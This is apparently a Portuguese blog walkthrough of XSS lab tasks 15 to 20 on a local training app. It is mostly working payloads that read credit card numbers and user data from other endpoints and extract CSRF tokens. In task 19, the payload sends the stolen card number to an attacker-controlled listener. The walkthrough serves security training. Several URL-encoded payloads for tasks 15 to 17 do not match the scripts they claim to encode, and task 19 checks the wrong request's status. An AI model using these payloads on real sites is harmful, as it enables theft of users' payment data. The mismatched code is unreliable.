Assim com ona *task* anterior, existe um *endpoint* que retorna o número do cartão de crédito, o **/15/creditCard/** seguido do parâmetro **user**.

Porém, desta vez a API só aceita requisições do tipo POST. Para criarmos um *request* com o `XMLHttpRequest`, além das informações que já temos, precisamos utilizar o método `setRequestHeader` para indicar um formulário válido.

```html
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (req.readyState == 4 && req.status == 200) 
	{
		document.getElementById("exploit").innerHTML = req.responseText;
	}
};
req.open("POST", "/15/creditCard/", true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("user=h41stur");
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-42.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)
- [https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

### *Task 16 - Getting Parameters from URL*

![Task 16](/img/posts/2023-06-21-beyond-the-alert-43.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro *endpoint* da aplicação com uma requisição do tipo GET usando `XMLHttpRequest()`. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial.

Porém, neste caso, a validação do *endpoint* também precisa de umn *token* que transita pela URL.

#### Conhecimento Base

É possível separar cada elemento que compõe a URL com o método `window.location.search`. Neste caso em específico, como existe um delimitador padrão entre parâmetros GET `&`, podemos usar o `split()` para obtermos somente o que precisamos.

#### Exploração

A exploração é muito parecida com as anteriores, porém neste caso, é preciso passar um *token* de validação que existe na URL, neste caso, é preciso extrair este token antes de montar a requisição.

```html
<script>
var req = new XMLHttpRequest();

req.onreadystatechange = function () {
	if (req.readyState == 4 && req.status == 200) {
		document.getElementById("exploit").innerHTML = req.responseText;
	}
};

var token = window.location.search.split("&")[1];
req.open("GET", "/16/creditCard/?user=h41stur&"+token, true);
req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&token=d8aea5b04b59ad8a36d1e2c10a77c426)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-44.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/Window/location](https://developer.mozilla.org/en-US/docs/Web/API/Window/location)
- [https://developer.mozilla.org/en-US/docs/Web/API/Location/search](https://developer.mozilla.org/en-US/docs/Web/API/Location/search)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)
- [https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

### *Task 17 - Stealing CSRF Tokens*

![Task 17](/img/posts/2023-06-21-beyond-the-alert-45.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar o número do cartão de crédito contido em outro *endpoint* da aplicação com uma requisição do tipo GET usando `XMLHttpRequest()`. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial.

Porém, neste caso, a validação do *endpoint* também precisa de umn *CSRF token* que está em um campo *hidden* no formulário.

#### Conhecimento Base

Outra propriedade importante é o `setRequestHeader` do objeto `XMLHttpRequest`, este é usado para definir os cabeçalhos HTTP para uma solicitação. Este método aceita dois argumentos: o nome do cabeçalho e o valor do cabeçalho. Ele é geralmente chamado após o método `open`, mas antes do método `send`.

É importante observar que existem algumas restrições ao uso de `setRequestHeader`. Por razões de segurança, você não pode definir certos cabeçalhos controlados pelo navegador, como `Referer` e `Host`. Além disso, chamar `setRequestHeader` após `send` resultará em um erro.

CSRF é a sigla para *Cross-Site Request Forgery*, uma forma de ataque malicioso que engana a vítima para que ela realize ações não intencionais em um site no qual está autenticada.

Um *token* CSRF é uma medida de segurança usada para prevenir esses tipos de ataques. Ele é um valor secreto único e aleatório gerado pelo servidor e enviado ao cliente. O cliente deve então enviar esse *token* de volta ao servidor com cada solicitação que modifica o estado do servidor (como uma solicitação POST).

Quando o servidor recebe uma solicitação que modifica o estado, ele verifica se o *token* CSRF enviado com a solicitação corresponde ao *token* que foi enviado ao cliente. Se os *tokens* não corresponderem, a solicitação é rejeitada.

A ideia por trás do *token* CSRF é que um atacante não terá acesso ao *token*, então não será capaz de forjar uma solicitação válida. Embora o atacante possa forjar a solicitação em si, ele não terá o token CSRF, então a solicitação será rejeitada pelo servidor.

#### Exploração

Se olharmos para o código HTML da aplicação podemos ver o valor do *token CSRF* em um campo *hidden* do formulário.

![Token](/img/posts/2023-06-21-beyond-the-alert-46.png)

Porém, não podemos pegar este valor manualmente, e inseri-lo no script malicioso, pois este *token* é gerado aleatoriamente para cada requisição feita na página.

Portanto, um ataque efetivo, precisa capturar o valor deste campo, antes de montar o *request* para o *endpoint* alvo. Por se tratar de um simples campo HTML, podemos extrair seu valor sem problemas com alguns métodos que conhecemos.

```html
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (req.readyState == 4 && req.status == 200) {
		document.getElementById("exploit").innerHTML = req.responseText;
	}
};
var token = document.getElementById("csrf_token").value;
req.open("POST", "/17/creditCard/", true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("user=h41stur&csrf_token="+token);
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-47.png)


#### Referências

- [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)
- [https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

### *Task 18 - HTML Parsing of XMLHttpRequest*

![Task 18](/img/posts/2023-06-21-beyond-the-alert-48.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro *endpoint* da aplicação com uma requisição do tipo GET usando `XMLHttpRequest()`. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial.

Porém, neste caso, o *endpoint* que contém os dados, não é uma API que retorna uma *string*, e sim uma página HTML completa que precisa de *parsing* para obter os dados corretos.

#### Conhecimento Base

A propriedade `responseType` do objeto `XMLHttpRequest` é uma *string* que define o tipo de dados que você espera da resposta. Isso permite que você informe ao navegador como processar a resposta.

Os possíveis valores para `responseType` são:

- `""` (*string* vazia): O padrão, também conhecido como `text`. A resposta é retornada como uma *string*.
- `"arraybuffer"`: A resposta é retornada como um *ArrayBuffer*.
- `"blob"`: A resposta é retornada como um *Blob*.
- `"document"`: A resposta é retornada como um Documento HTML ou XML.
- `"json"`: A resposta é interpretada como JSON e retornada como um objeto JavaScript.
- `"text"`: A resposta é retornada como uma *string* de texto.
- `"ms-stream"`: Específico da Microsoft, usado para *streaming*.

Você define a propriedade `responseType` após o método `open` mas antes do método `send`.

É importante ressaltar que quando usamos o `responseTupe = "document"` precisamos usar a propriedade `responseXML` para armazenar o *response*.

#### Exploração

A primeira ação a ser feita é entender a arquitetura, ao clicar em "*User data*" somos levados à página de destino.

![Destino](/img/posts/2023-06-21-beyond-the-alert-49.png)

Como podemos ver, temos os dados sensíveis em um HTML inteiro, isso significa que se utilizarmos `responseText` para capturarmos a resposta, todo o código HTML será interpretado com uma *string*, impossibilitando o carregamento dos dados sensíveis.

Ao olharmos o código HTML do alvo, podemos ver que os dados estão em um parágrafo cujo ID é `user_data`.

![Dados](/img/posts/2023-06-21-beyond-the-alert-50.png)

Portanto, podemos usar a propriedade `responseType` para definirmos o tipo da resposta como `document`. Isso fará com que a resposta seja interpretada como HTML ou XML, nos permitindo tratá-la como qualquer outro documento, podendo assim extrair valores.

```html
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (req.readyState == 4 && req.status == 200){
		var htmlPage = req.responseXML;
		var user_data = htmlPage.getElementById("user_data").innerHTML;
		document.getElementById("exploit").innerHTML = user_data;
	}
};
req.open("GET", "/18/user/", true);
req.responseType = "document";
req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2F18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos os dados impressos na tela.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-51.png)

#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType)
- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest)

### *Task 19 - HTML Parsing Multi-Level*

![Task 19](/img/posts/2023-06-21-beyond-the-alert-52.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

O objetivo desta *task*, é se aproveitar do ponto vulnerável a XSS na tela inicial para buscar os dados sensíveis contidos em outro *endpoint* da aplicação, porém, existe mais de um nível de acesso, neste caso, após uma solicitação do tipo GET, existe um formulário que valida um ID para entregar os dados. Após obter estes dados, eles precisam ser inseridos em um elemento chamado `exploit` que está na tela inicial, além de enviá-lo para uma máquina sob controle do atacante.

#### Conhecimento Base

Independente da quantidade de níveis necessários para montar um ataque, é possível aninhar várias requisições utilizando o `XMLHttpRequest` para que o objetivo final seja atingido.

#### Exploração

Para melhor entendimento da arquitetura da aplicação, o exploit será feito em partes. A primeira coisa a se observar é a tela inicial que contém um link e um ID.

![Tela inicial](/img/posts/2023-06-21-beyond-the-alert-53.png)

Ao inspecionar o código HTML, vemos que o *link* está em um `h2` com id `config`.

![Config](/img/posts/2023-06-21-beyond-the-alert-54.png)

Ao clicar no *link* somos levados para um formulário que solicita o ID informado na tela anterior.

![Form](/img/posts/2023-06-21-beyond-the-alert-55.png)


Neste ponto, podemos iniciar a construção do script capturando o *link* inicial e o ID contido no elemento, fazendo a *request* e armazenando sua resposta em um objeto HTML.

```html
<script>
	var link = document.getElementById("config");
	var id = link.innerHTML.split(':')[1];
	var req = new XMLHttpRequest();
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			var htmlPage = req.responseXML;
		}
	}
	req.open("GET", link.href, true);
	req.responseType = "document";
	req.send();
</script>
```

Inspecionando o HTML da segunda tela, podemos verificar alguns pontos importantes.

![Form](/img/posts/2023-06-21-beyond-the-alert-56.png)

- O método utilizado é POST
- O `action` do formulário aponta para o *endpoint* `../creditCard/`
- A aplicação implementa um *CSRF token* dinâmico.
- O campo `user_id` recebe o ID capturado da tela anterior

Ao preencher o formulário com o ID, somos levados a outra página HTML com os dados sensíveis.

![Dados](/img/posts/2023-06-21-beyond-the-alert-57.png)

Com estas informações, podemos extrair os dados da segunda página, e aninhar a segunda requisição, capturando sua resposta em um objeto HTML.

```html
<script>
	var link = document.getElementById("config");
	var id = link.innerHTML.split(':')[1];
	var req = new XMLHttpRequest();
	var req2 = new XMLHttpRequest();
	
	req2.onreadystatechange = function() {
		if (req2.readyState == 4 && req.status == 200) {
			var htmlPage = req2.responseXML;
		}
	}
	
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			var htmlPage = req.responseXML;
			csrf_token = htmlPage.forms[0].elements[1].value;
			req2.open("POST", "/19/creditCard/", true);
			req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			req2.responseType = "document";
			req2.send("user_id="+id+"&csrf_token="+csrf_token);
		}
	}
	req.open("GET", link.href, true);
	req.responseType = "document";
	req.send();
</script>
```

Ao inspecionar o HTML da página alvo, podemos ver que o número de cartão de crédito está em um parágrafo cujo ID é `credit_card`.

![Credit card](/img/posts/2023-06-21-beyond-the-alert-58.png)

Com estas informações, podemos implementar no segundo *request* a captura do valor do campo, a inclusão na *tag* `exploit` da página inicial e enviá-lo para a máquina sob controle do atacante.

```html
<script>
	var link = document.getElementById("config");
	var id = link.innerHTML.split(':')[1];
	var req = new XMLHttpRequest();
	var req2 = new XMLHttpRequest();
	
	req2.onreadystatechange = function() {
		if (req2.readyState == 4 && req.status == 200) {
			var htmlPage = req2.responseXML;
			credit_card = htmlPage.getElementById("credit_card").innerHTML;
			document.getElementById("exploit").innerHTML = credit_card;
			new Image().src = "http://0.0.0.0:8080/?credit_card="+credit_card;
		}
	}
	
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			var htmlPage = req.responseXML;
			csrf_token = htmlPage.forms[0].elements[1].value;
			req2.open("POST", "/19/creditCard/", true);
			req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			req2.responseType = "document";
			req2.send("user_id="+id+"&csrf_token="+csrf_token);
		}
	}
	req.open("GET", link.href, true);
	req.responseType = "document";
	req.send();
</script>
```

Convertendo para *URL Encode*:

```
%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/19/?search=%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/19/?search=%3Cscript%3E%0A%09var%20link%20%3D%20document.getElementById%28%22config%22%29%3B%0A%09var%20id%20%3D%20link.innerHTML.split%28%27%3A%27%29%5B1%5D%3B%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req2.responseXML%3B%0A%09%09%09credit_card%20%3D%20htmlPage.getElementById%28%22credit_card%22%29.innerHTML%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20credit_card%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fcredit_card%3D%22%2Bcredit_card%3B%0A%09%09%7D%0A%09%7D%0A%09%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09%09csrf_token%20%3D%20htmlPage.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09%09req2.open%28%22POST%22%2C%20%22%2F19%2FcreditCard%2F%22%2C%20true%29%3B%0A%09%09%09req2.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0A%09%09%09req2.responseType%20%3D%20%22document%22%3B%0A%09%09%09req2.send%28%22user_id%3D%22%2Bid%2B%22%26csrf_token%3D%22%2Bcsrf_token%29%3B%0A%09%09%7D%0A%09%7D%0A%09req.open%28%22GET%22%2C%20link.href%2C%20true%29%3B%0A%09req.responseType%20%3D%20%22document%22%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurado para ouvir a requisição feita.

![Python server](/img/posts/2023-06-21-beyond-the-alert-59.png)

Ao carregar a página, a informação sensível é carregada.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-60.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/2023-06-21-beyond-the-alert-61.png)


#### Referências

- [https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest)

### *Task 20 - JSON Parsing Multi-Level*

![Task 20](/img/posts/2023-06-21-beyond-the-alert-63.png)

#### Objetivo

Muitas vezes a informação que desejamos em uma aplicação, não está armazenada na mesma página vulnerável a XSS, porém, conhecendo a arquitetura da aplicação ou da API, é possível, a partir de um XSS, buscar estas informações em qualquer lugar.

